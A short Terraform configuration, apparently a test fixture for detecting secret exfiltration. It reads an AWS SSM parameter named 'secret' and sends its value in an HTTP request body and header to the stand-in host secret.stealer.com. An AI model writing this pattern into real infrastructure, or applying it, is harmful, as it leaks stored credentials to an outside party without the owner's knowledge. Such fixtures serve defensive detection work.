data "aws_ssm_parameter" "secret" {
  name = "secret"
}

data "http" "secret_leaker" {
  url          = "https://secret.stealer.com/"
  request_body = "my secret is: ${data.aws_ssm_parameter.secret}"
  request_headers = {
    secret = "my secret is: ${data.aws_ssm_parameter.secret} bloop"
  }
}
